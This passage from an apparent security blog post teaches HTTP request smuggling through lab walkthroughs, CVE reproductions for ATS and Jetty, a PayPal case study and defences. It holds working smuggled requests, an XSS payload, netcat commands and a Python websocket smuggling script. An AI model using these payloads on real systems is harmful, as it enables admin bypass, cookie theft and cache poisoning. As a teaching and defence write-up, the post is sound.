nothing 12 The second:\nGPOST / HTTP/1.1 0 This sent an unrecognized HTTP Method GPOST request.\nAttack Surface Above we have introduced several attack methods, let us see what these attack methods can be used for. We will also cooperate with the experimental environment to help understand and reproduce.\nBypass Front-end Security Controls Two experimental environments are provided here. One is CL-TE Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability and the othter is TE-CL Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability.The two experiments finally achieved the same goal. Here we randomly choose CL-TE for experiments.\n This lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding. There\u0026rsquo;s an admin panel at /admin, but the front-end server blocks access to it.\nTo solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.\n The architecture is the same, but this time we need to use HTTP Smuggling to obtain admin permissions and delete the carlos user.\nAfter we generate the LAB, if we directly access /admin, we will find\u0026quot;Path / admin is blocked\u0026quot;. It seems that we cannot access /admin through normal methods. Then we try HTTP Smuggling and send the following data packet twice.\nPOST / HTTP/1.1 Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 28 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 The response obtained is as follows.\n \n \nYou can see that the second request we got the response of /admin\n\u0026lt;div class=\u0026#34;container is-page\u0026#34;\u0026gt; Admin interface only available if logged in as an administrator, or if requested as localhost \u0026lt;/div\u0026gt; So we add the HOST header and send it again a few times\nPOST / HTTP/1.1 Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 45 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost We can see that the content of the /admin panel. If it dosen\u0026rsquo;t work, you can send it a few times.\n \nWe got the deleted api, so we can use HTTP Smuggling to access this /admin/delete?username=carlos, and construct the following data packet.\nPOST / HTTP/1.1 Host: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a Content-Length: 63 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost  \nThis attack method is similar to HTTP SSRF. The main point is to control the value of CL. For example, the value of CL in the first packet is 28, which is calculated as follows:\n0\\r\\n\t--\u0026gt; 3 bytes \\r\\n\t--\u0026gt; 2 bytes GET /admin HTTP/1.1\\r\\n\t--\u0026gt; 19+2 = 21 bytes \\r\\n\t--\u0026gt; 2 bytes So it is 3+2+21+2 = 28 bytes in total.\nThe situation of TE-CL is similar, so the example will not be repeated here.\nRevealing Front-end Request Rewriting  In some network environments, the front-end proxy server does not forward the request directly to the back-end server after receiving the request. Instead, it adds some necessary fields and then forwards it to the back-end server. These fields are required by the backend server to process the request, such as:\n- Describe the protocol name and password used by the TLS connection - XFF header containing the user\u0026rsquo;s IP address - User\u0026rsquo;s session token ID\nIn short, if we can\u0026rsquo;t get the fields added or rewritten by the proxy server, our smuggled past requests can\u0026rsquo;t be processed correctly by the backend server. So how do we get these values? PortSwigger provides a very simple method, mainly in three major steps:\n- Find a POST request that can output the value of the request parameter to the response - Put the special parameter found in the POST request at the end of the message. - Then smuggle this request and then send a normal request directly, and some fields that the front-end server rewrites for this request will be displayed.\n Sometimes the Front server adds some request headers to the forwarded request and forwards them to the Backend server. We can use HTTP Smuggling to leak these request headers. We also use LAB to understand. Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting\n This lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding.\nThere\u0026rsquo;s an admin panel at /admin, but it\u0026rsquo;s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It\u0026rsquo;s similar to the X-Forwarded-For header but has a different name.\nTo solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.\n According to the title hint here, the scene is a CL-TE scene and a search box is given. We try to search for a 123 at will. We can find that the search result \u0026ldquo;123\u0026rdquo; is directly echoed into the corresponding one.\n \nAttempted access using HTTP Smuggling, but was blocked.\n \nBut we can try to use the search echo to leak the request header forwarded by the Front server:\n \nIf you only add the X-*-Ip request header later, you cannot access the admin panel, because this will make Backend receive two duplicate request headers. In this scenario, the Backend server judges the duplicate request headers.\n \nSo we need to \u0026ldquo;hide\u0026rdquo; the request headers added by the Front server, we can use Smuggling to \u0026ldquo;hide\u0026rdquo; the request headers added by other Front servers, and then we can get the admin panel.\n \nThe whole process looks relatively simple, but if you do it carefully, you will find the CL value is quite important. Let\u0026rsquo;s take a look at how the CL value of the packet requested by the Front is calculated:\n0\\r\\n\t--\u0026gt;\t3 bytes \\r\\n\t--\u0026gt; 2 bytes POST / HTTP/1.1\\r\\n\t--\u0026gt;\t17 bytes Content-Length: 70\\r\\n\t--\u0026gt;\t20 bytes Content-Type: application/x-www-form-urlencoded\\r\\n\t--\u0026gt;\t49 bytes \\r\\n\t--\u0026gt; 2 bytes search=123\t--\u0026gt; 10 bytes There are 103 bytes in total. And the CL here may not be 70. Here, we only control how many bytes are leaked.\nAnother thing to note is that if you don\u0026rsquo;t add a Content-Type field, you need to add a CRLF at the end, otherwise it will return 400.\nCapturing other users' requests Now that we can get middleware requests, of course, we can also try to get requests from other users, and also get cookies, etc. Lab: Exploiting HTTP request smuggling to capture other users' requests\n This lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding.\nTo solve the lab, smuggle a request to the back-end server that causes the next user\u0026rsquo;s request to be stored in the application. Then retrieve the next user\u0026rsquo;s request and use the victim user\u0026rsquo;s cookies to access their account.\n The principle is relatively simple. We can find a place to send a comment, and then use the comment to perform HTTP Smuggling. For example, we can construct the following request packet.\nPOST / HTTP/1.1 Host: ac951f7d1e9ea625803c617f003f005c.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Content-Length: 271 Transfer-Encoding: chunked 0 POST /post/comment HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 600 Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN\u0026amp;postId=5\u0026amp;name=1\u0026amp;email=1%40qq.com\u0026amp;website=http%3A%2F%2Fwww.baidu.com\u0026amp;comment=1 As long as the later CL is large enough, we can use HTTP Smuggling to stitch the next user\u0026rsquo;s request into our last comment parameter, and then we can see the request header of others when we look at the comment.\n \nExploit Reflected XSS This usage scenario may be limited and rare, but if HTTP Smuggling \u0026amp; reflected XSS exists, we can combinate two methods to leak others' cookies.\n This lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding.\nThe application is also vulnerable to reflected XSS via the User-Agent header.\nTo solve the lab, smuggle a request to the back-end server that causes the next user\u0026rsquo;s request to receive a response containing an XSS exploit that executes alert(1).\n Still in the CL-TE, we can find a reflection XSS at the UA, but this is useless, so we have to find some way to upgrade the hazard.\n \nWe can construct the following packets, just send them once.\nPOST / HTTP/1.1 Host: ac811f011e27d43b80301693005a0007.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ Upgrade-Insecure-Requests: 1 Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: \u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 Then we casually visit any page on the site and it will alert(1) because our request is embedded in the second request above.\n \n \nTurn An On-Site Redirect Into An Open Redirect This attack scenario is when the target uses a 30x code to redirect and uses the Host header to redirect. For example, we send following requests.\nGET /home HTTP/1.1 Host: normal-website.com We will get responses.\nHTTP/1.1 301 Moved Permanently Location: https://normal-website.com/home/ It looks harmless, but if we cooperate with HTTP Smuggling, it will be a problem. Such as:\nPOST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 54 Transfer-Encoding: chunked 0 GET /home HTTP/1.1 Host: attacker-website.com Foo: X The subsequent requests after smuggling look like this:\nGET /home HTTP/1.1 Host: attacker-website.com Foo: XGET /scripts/include.js HTTP/1.1 Host: vulnerable-website.com Then if the server redirects according to the Host header, we will get the following response.\nHTTP/1.1 301 Moved Permanently Location: https://attacker-website.com/home/ In this way, the user who visits /scripts/include.js will be redirected to the URL we control.\nPerform Web Cache Poisoning This scenario is also based on the Host redirect attack scenario above. If the Front server still has cache static resources, we can cooperate with HTTP Smuggling to perform cache poisoning. Lab: Exploiting HTTP request smuggling to perform web cache poisoning\n This lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding. The front-end server is configured to cache certain responses.\nTo solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server.\n This environment is also a scenario where the host can be modified to redirect, and the /post/next?postId=2 route redirect to /post?postId=4.\nAccording to the description of the call, we need to implement cache poisoning. For example, here we choose /resources/js/tracking.js for poisoning. LAB also gives us a service for manufacturing poisoning, so we can set the following settings.\n \nSend the following packets once.\nPOST / HTTP/1.1 Host: ac7a1f141fadd93d801c469f005500bf.web-security-academy.net User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session=f6c7ZBB52a6iedorGSywc8jM6USu4685 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Content-Length: 178 Transfer-Encoding: chunked 0 GET /post/next?postId=3 HTTP/1.1 Host: ac701fe61fabd97b8027465701f800a8.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=1 Then visit /resources/js/tracking.js:\n \nWe can see that the redirect address of the response packet has been changed to the our exploit address, and then we visit the normal server homepage.\n \nWe can alert(1) !\nThe entire process can be understood using the following processes.\nInnocent Attacker Front Backend | | | | | |--A(1A+1/2B)--\u0026gt;| | | | |--A(1A+1/2B)--\u0026gt;| | | |\u0026lt;-A(200)-------| | | | [1/2B] | |\u0026lt;-A(200)-------| [1/2B] | |--C-----------\u0026gt;| [1/2B] | | |--C-----------\u0026gt;| * ending B * | | [*CP*]\u0026lt;--B(200)----| | |\u0026lt;--B(200)------| | |--C---------------------------\u0026gt;| | |\u0026lt;--B(200)--------------------[HIT] |  1A + 1/2B means request A + an incomplete query B A(X) : means X query is hidden in body of query A CP : Cache poisoning  Similar to the previous flowchart, because /resources/js/tracking.js requested in C will be cached by Front as a static resource, and we use HTTP Smuggling to direct this request to our exploit server and returnalert(1) to request C, and then this response packet will be cached by the Front server, so we have successfully poisoned.\nPerform Web Cache Deception In fact, this scenario is similar to cache poisoning, but with a slight difference. According to more official statements, cache cheating and cache poisoning have the following differences.\n What is the difference between web cache poisoning and web cache deception?\n- In web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users. - In web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.\n This we do not cooperate with Lab. Because the environment provided by Lab maybe not work correctly.\nBut we can do like this to understand easily. We send the following HTTP request.\nPOST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 43 Transfer-Encoding: chunked 0 GET /private/messages HTTP/1.1 Foo: X The smuglling request will use Foo: X to hide the first line of the next request header sent, which is the line GET /xxx HTTP/1.1, and this request will be accessed with the user\u0026rsquo;s cookie. Similar to a CSRF, the request becomes the following request header.\nGET /private/messages HTTP/1.1 Foo: XGET /static/some-image.png HTTP/1.1 Host: vulnerable-website.com Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z As long as we send more times, once the user accesses the static resource, it may be cached by the Front server, and we can get the information of the user /private/messages. There may be a lot of repeated packet sending here, because you need to construct a static resource cache, or you need some luck.\nSo far, the basic attack surface of HTTP Smuggling has been introduced.\nReal World Paypal First of all, I have to talk about the Paypal vulnerability instance shared by the author of HTTP Smuggling on Black Hat this year.\nThe author first poisoned a js file for Paypal login through HTTP Smuggling.\nPOST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 Host: c.paypal.com Content-Length: 61 Transfer-Encoding: chunked 0 GET /webstatic HTTP/1.1 Host: skeletonscribe.net? X: XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1  Host: c.paypal.com Connection: close HTTP/1.1 302 Found Location: http://skeletonscribe.net?, c.paypal.com/webstatic/ But the Paypal login page has a CSP rule script-src which block this redirect.\n \nLater, the author noticed that the login page loads a sub-page on c.paypal.com in a dynamically generated iframe. This sub-page didn\u0026rsquo;t use CSP and also used a js file poisoned by the author! Although this can control the iframe page, because of the same-origin policy, the data of the parent page cannot be read.\n \nHis colleague then discovered a page at paypal.com/us/gifts that didn\u0026rsquo;t use CSP, and also imported his poisoned JS file. By using his JS to redirect the c.paypal.com iframe to that URL (and triggering our JS import for the third time) he could finally access the parent and steal plaintext PayPal passwords from everyone who logged in using Safari or IE.\n \nPaypal\u0026rsquo;s first fix was to modify the Akamai configuration to reject requests containing Transfer-Encoding: chunked. But the author bypassed it quikly by constructing a newline header.\nTransfer-Encoding: chunked ATS  â€‹\tApache Traffic Server (ATS) is an efficient, scalable HTTP proxy and cache server for the Apache Software Foundation.\nThere are multiple HTTP smuggling and cache poisoning issues when clients making malicious requests interact with Apache Traffic Server (ATS). This affects versions 6.0.0 to 6.2.2 and 7.0.0 to 7.1.3.\nIn NVD, we can find four patches for this vulnerability, so let\u0026rsquo;s take a closer look.\nCVE-2018-8004 Patch list:\nhttps://github.com/apache/trafficserver/pull/3192\nhttps://github.com/apache/trafficserver/pull/3201\nhttps://github.com/apache/trafficserver/pull/3231\nhttps://github.com/apache/trafficserver/pull/3251\nNote: Although the vulnerability notification describes the scope of the vulnerability to version 7.1.3, from the version of the patch archive on github, most of the vulnerabilities have been fixed in version 7.1.3.\n About the analysis and recurrence of these four patches, I think @mengchen has already written very detailed, I will not repeat to talk about them. It is recommended to read the original part HTTP Smuggling Attack Exampleâ€”â€”CVE-2018-8004.\nHere we talk about the part that is not in the original text.\n\t[dummy-host7.example.com] | +-[8080]-----+ | 8007-\u0026gt;8080 | | ATS7 | | | +-----+------+ | | +--[80]----+ | 8002-\u0026gt;80 | | Nginx | | | +----------+ We build the above scenario, and we can use the docker experimental environment I built. Here is lab1\nRequest Splitting using Huge Header We can experiment by using a header of 65535 characters.For example, we can send a request which have got a header of 65535 characters to ATS 7 by using the following code.\nprintf \u0026#39;GET_/something.html?zorg2=5_HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:_dummy-host7.example.com\\r\\n\u0026#39;\\ \u0026#39;X:_\u0026#34;%65534s\u0026#34;\\r\\n\u0026#39;\\ \u0026#39;GET_http://dummy-host7.example.com/index.html?replaced=0\u0026amp;cache=8_HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ |tr \u0026#34; \u0026#34; \u0026#34;1\u0026#34;\\ |tr \u0026#34;_\u0026#34; \u0026#34; \u0026#34;\\ |nc -q 1 127.0.0.1 8007 Nginx will directly return a 400 code error, but it is more interesting with ATS 7. We will get a 400 response and a 200 response from ATS 7.\nHTTP/1.1 400 Invalid HTTP Request Date: Fri, 29 Nov 2019 18:52:42 GMT Connection: keep-alive Server: ATS/7.1.1 Cache-Control: no-store Content-Type: text/html Content-Language: en Content-Length: 220 \u0026lt;HTML\u0026gt; \u0026lt;HEAD\u0026gt; \u0026lt;TITLE\u0026gt;Bad Request\u0026lt;/TITLE\u0026gt; \u0026lt;/HEAD\u0026gt; \u0026lt;BODY BGCOLOR=\u0026#34;white\u0026#34; FGCOLOR=\u0026#34;black\u0026#34;\u0026gt; \u0026lt;H1\u0026gt;Bad Request\u0026lt;/H1\u0026gt; \u0026lt;HR\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica,Arial\u0026#34;\u0026gt;\u0026lt;B\u0026gt; Description: Could not process this request. \u0026lt;/B\u0026gt;\u0026lt;/FONT\u0026gt; \u0026lt;HR\u0026gt; \u0026lt;/BODY\u0026gt; HTTP/1.1 200 OK Server: ATS/7.1.1 Date: Fri, 29 Nov 2019 18:52:42 GMT Content-Type: text/html Content-Length: 119 Last-Modified: Fri, 29 Nov 2019 05:37:09 GMT ETag: \u0026#34;5de0ae85-77\u0026#34; X-Location-echo: /index.html?replaced=0\u0026amp;cache=8 X-Default-VH: 0 Cache-Control: public, max-age=300 Accept-Ranges: bytes Age: 0 Connection: keep-alive \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Nginx default static page\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;It works!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; Jetty Jetty has three CVEs related to HTTP Smuggling.\n  CVE-2017-7656 HTTP/0.9 issue\n  In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled poorly. An HTTP/1 style request line (i.e. method space URI space version) that declares a version of HTTP/0.9 was accepted and treated as a 0.9 request. If deployed behind an intermediary that also accepted and passed through the 0.9 version (but did not act on it), then the response sent could be interpreted by the intermediary as HTTP/1 headers. This could be used to poison the cache if the server allowed the origin client to generate arbitrary content in the response.     CVE-2017-7657 Chunk size attribute truncation\n  In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), transfer-encoding chunks are handled poorly. The chunk length parsing was vulnerable to an integer overflow. Thus a large chunk size could be interpreted as a smaller chunk size and content sent as chunk body could be interpreted as a pipelined request. If Jetty was deployed behind an intermediary that imposed some authorization and that intermediary allowed arbitrarily large chunks to be passed on unchanged, then this flaw could be used to bypass the authorization imposed by the intermediary as the fake pipelined request would not be interpreted by the intermediary as a request.     CVE-2017-7658 Double Content-Length\n  In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two content-lengths headers, Jetty ignored the second. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decided on the shorter length, but still passed on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary was imposing authorization, the fake pipelined request would bypass that authorization.     For CVE-2017-7658, we will not explore it anymore, because as mentioned before, we mainly talk about the other two more interesting places.\nHTTP/0.9 Environment can still use what I built jetty lab enviroment. Then we send a standard HTTP / 0.9 request as follows.\nprintf \u0026#39;GET /?test=4564\\r\\n\u0026#39;|nc -q 1 127.0.0.1 8994 We will get a 400 code response.\nHTTP/1.1 400 HTTP/0.9 not supported Content-Type: text/html;charset=iso-8859-1 Content-Length: 65 Connection: close Server: Jetty(9.4.9.v20180320) \u0026lt;h1\u0026gt;Bad Message 400\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason: HTTP/0.9 not supported\u0026lt;/pre\u0026gt; We add the version identifier.\nprintf \u0026#39;GET /?test=4564 HTTP/0.9\\r\\n\\r\\n\u0026#39;|nc -q 1 127.0.0.1 8994 Although this is a format that is not supported by HTTP/0.9, there are unexpected gains, with a 200 response.\n\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Sample \u0026quot;Hello, World\u0026quot; Application\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body bgcolor=white\u0026gt; \u0026lt;table border=\u0026quot;0\u0026quot;\u0026gt; \u0026lt;tr\u0026gt; ... No headers, only body. This request was parsed by HTTP/0.9.\nWhat\u0026rsquo;s more interesting is that adding headers not supported by HTTP/0.9 will have unexpected results. Here we add a header that extracts the content of the response packet.\nprintf 'GET /?test=4564 HTTP/0.9\\r\\n'\\ 'Range: bytes=36-42\\r\\n'\\ '\\r\\n'\\ |nc -q 1 127.0.0.1 8994 , World We will find that the body content has been extracted by us. Combined with the HTTP Response Splitting in HTTP Version part mentioned above, we can perform various fancy attacks.\nChunk size attribute truncation We send the request with the following code.\nprintf \u0026#39;POST /?test=4973 HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;Content-Type: application/x-www-form-urlencoded\\r\\n\u0026#39;\\ \u0026#39;Host: localhost\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;100000000\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;POST /?test=4974 HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Content-Length: 5\\r\\n\u0026#39;\\ \u0026#39;Host: localhost\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ |nc -q 1 127.0.0.1 8994|grep \u0026#34;HTTP/1.1\u0026#34; Then we can get two 200 responses. But according to the standard of the chunk, although the second part looks like a request, it should actually be counted in the chunk data. The problem is here. Jetty returned two requests. 100000000 is treated as 0, which is the chunk end part, so there are two reasons for the request.\nWe can try more.\nprintf \u0026#39;POST /?test=4975 HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;Content-Type: application/x-www-form-urlencoded\\r\\n\u0026#39;\\ \u0026#39;Host: localhost\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;1ff00000008\\r\\n\u0026#39;\\ \u0026#39;abcdefgh\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;POST /?test=4976 HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Content-Length: 5\\r\\n\u0026#39;\\ \u0026#39;Host: localhost\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ |nc -q 1 127.0.0.1 8994|grep \u0026#34;HTTP/1.1\u0026#34; Here we still get two 200 responses, that is, the first chunk size 1ff00000008 was truncated to 8 by jetty. The chunk data part only has abcdefgh, so two responses are returned.\nSimilar to Apache CVE-2015-3183, jetty will only take the last 8 bytes of chunk size:\nffffffffffff00000000\\r\\n ^^^^^^^^ 00000000 =\u0026gt; size 0 1ff00000008\\r\\n ^^^^^^^^ 00000008 =\u0026gt; size 8 Websocket In fact, this part can be used as a separate part, but I think this article is so long, so we just talk about a brief introduction. In Hackactivity 2019, @0ang3el proposed Websocket-related attack techniques [What\u0026rsquo;s wrong with WebSocket APIs? Unveiling vulnerabilities in WebSocket APIs](Https://www.slideshare.net/0ang3el/whats-wrong-with-websocket- apis-unveiling-vulnerabilities-in-websocket-apis), what interests me is the part of Websocket Smuggling. The author disclosure the relevant description in websocket-smuggle.\nWhat is this attack surface? To sum up for you, when the connection is established in the websocket, if the reverse proxy does not fully comply with the RFC 6445 standard, the Sec-WebSocket-Version version is not handled properly. The connection between the client and the back-end server TCP/TLS won\u0026rsquo;t be closed, so it cause an attack that we could conduct a smuglling request.\nHere we assume that the solr service exists on the internal network and cannot be accessed from the external network. If websocket smuggling exists, we can write the following code to access the solr service.\nimport socket req1 = \u0026#34;\u0026#34;\u0026#34;GET /socket.io/?EIO=3\u0026amp;transport=websocket HTTP/1.1 Host: ip:port Sec-WebSocket-Version: 1338 Upgrade: websocket \u0026#34;\u0026#34;\u0026#34;.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) req2 = \u0026#34;\u0026#34;\u0026#34;GET /solr/##/ HTTP/1.1 Host: localhost:8983 \u0026#34;\u0026#34;\u0026#34;.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) def main(netloc): host, port = netloc.split(\u0026#39;:\u0026#39;) sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, int(port))) sock.sendall(req1) sock.recv(4096) sock.sendall(req2) ## print req2 data = sock.recv(4096) data = data.decode(errors = \u0026#39;ignore\u0026#39;) print(data) data = sock.recv(4096) data = data.decode(errors = \u0026#39;ignore\u0026#39;) print(data) sock.shutdown(socket.SHUT_RDWR) sock.close() if __name__ == \u0026#34;__main__\u0026#34;: main(\u0026#39;ip:port\u0026#39;) Golang This is an interesting part. It was fuzzed at the beginning of October. Finally, I decided to test caddy , and took it to fuzz. Because I was lazy, I used the environment on the docker hub [caddy](https: //hub.docker. com/r/abiosoft/caddy).\nSo, here we are.\n \nI was very happy at the time, thinking that getting a CVE was so simple. Because it is smiliar with Netty CVE , It could also produce a parsing difference. Then I and the mentor carefully explored the reason for this, followed the code, and found that it may be the cause of a native library in Golang.\nI was happy at the time, and quickly searched how to raise an issue with Golang. But then I carefully worked on it for a while. I found that this issue had been mentioned on September 27 net / http: invalid headers are normalized, allowing request smuggling, Golang also fixed the issue in version 1.13.1.\nIt\u0026rsquo;s unhappy to miss a CVE. : (\nBut at present(11/27) the caddy environment on dockerhub still has this problem, use it with caution!\nSomething Else There are related vulnerabilities disclosed on hackerone. Here are a few articles.\nWrite up of two HTTP Requests Smuggling\nHTTP Request Smuggling (CL.TE)\nHTTP Request Smuggling on vpn.lob.com\nDefence  We\u0026rsquo;ve known the harm of HTTP request smuggling, and we will question: how to prevent it? There are three general defenses (not specific to a particular server).\n- Disable TCP connection reuse between the proxy server and the back end server. - Use the HTTP/2 protocol. - The front and back ends use the same server.\nSome of the above measures can not solve the problem fundamentally, and there are many shortcomings, such as disabling TCP connection reuse between the proxy server and the back-end server, which will increase the pressure on the back-end server. Using HTTP/2 can\u0026rsquo;t be promoted under the current network conditions, even if the server supporting HTTP/2 protocol is compatible with HTTP/1.1. In essence, the reason for HTTP request smuggling is not the problem of protocol design, but the problem of different server implementations. I personally think that the best solution is to strictly implement the standards specified in RFC7230-7235, but this is the most difficult to achieve.\n However, I have read a lot of attack articles which all did not mention why HTTP/2 can prevent HTTP Smuggling. The original author also mentioned in a sentence.\n Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.\n Then I went to check the differences between HTTP/2 and HTTP/1.1. In my opinion, I think that Request multiplexing over a single TCP connection is mainly added to HTTP/2, which means that using HTTP/2 can use a single TCP connection to request resources. This reduces the possibility of TCP connection reuse, even if you can smuggle, you can only hit yourself and the introduction of a new binary framing mechanism also limits this attack. And more imporantly, Transfer-Encoding: chunk is canceled in HTTP/2. :P\nFor details, please refer to the introduction of HTTP / 2\n \nBonus After this period of study and research, I have also organized some related experiments into a docker environment, which is convenient for everyone to reproduce learningï¼šHTTP-Smuggling-Lab\nNow the environment is not much. If you think the lab is useful, plz give me a star. I will continue to add more environments later to facilitate everyone to understand and learn this attack tech. if I have enough time\nIf you think this post helps you, you could buy me a coffee to support my writing.\n\nReferences RFC7230\nHTTP Desync Attacks: Request Smuggling Reborn\nHTTP request smuggling\nregilero\u0026rsquo;s blog\nProtocol Layer Attack - HTTP Request Smuggling\nhttp request smuggling, cause by obfuscating TE header\nMultiple HTTP Smuggling reports\nHTTP/2: the difference between HTTP/1.1, benefits and how to use 